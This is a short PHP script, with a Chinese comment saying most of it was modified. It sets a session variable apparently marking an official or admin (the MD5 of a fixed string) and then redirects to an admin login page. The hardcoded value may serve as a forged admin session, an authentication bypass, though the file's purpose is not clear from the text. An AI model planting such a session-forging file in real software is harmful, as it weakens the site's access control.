<?php
//除header()外都是改的
session_start();
ob_start();
$_SESSION['guanyuan']=md5('1234adas');
header('Location: index.php?g=Admin&m=Login');
ob_end_flush();
?>